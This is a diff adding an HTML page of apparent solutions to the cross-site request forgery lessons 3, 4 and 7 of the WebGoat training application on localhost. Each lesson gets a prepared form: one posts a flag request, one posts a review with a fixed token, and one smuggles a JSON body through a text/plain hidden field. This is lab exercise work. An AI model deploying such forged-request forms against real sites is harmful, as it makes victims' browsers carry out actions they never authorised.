@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>lesson 3: Answer: Skript zum Lösen der Aufgabe</h1>
+    <form action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">
+        <label for="inp">Input a boolean to trigger the form</label>
+        <input type="type" name="inp" id="inp" value="false">
+        <input type="submit">
+    </form>
+
+    <h1>lesson 4: Answer: Skript zum Lösen der Aufgabe</h1>
+    <form action="http://localhost:8080/WebGoat/csrf/review" method="POST">
+        <label for="validateReq">Validation string for the request</label>
+        <input type="text" name="validateReq" id="inp" value="2aa14227b9a13d0bede0388a7fba9aa9">
+        <label for="reviewText">Review text</label>
+        <input type="text" name="reviewText" id="inp" value="">
+        <label for="stars">Give a star rating</label>
+        <input type="text" name="stars" id="inp" value="">
+        <input type="submit">
+    </form>
+
+    <h1>lesson 7: Answer: Skript zum lösen der Aufgabe</h1>
+    <form enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message" method="POST">
+        <input type="hidden"
+            name='{"name":"WebGoat","email":"1webgoat@webgoat.org","content":"WebGoat is the best!!","message":"Test","subject":"service'
+            value='"}'>
+        <input type="submit">
+    </form>
+</body>
+</html>
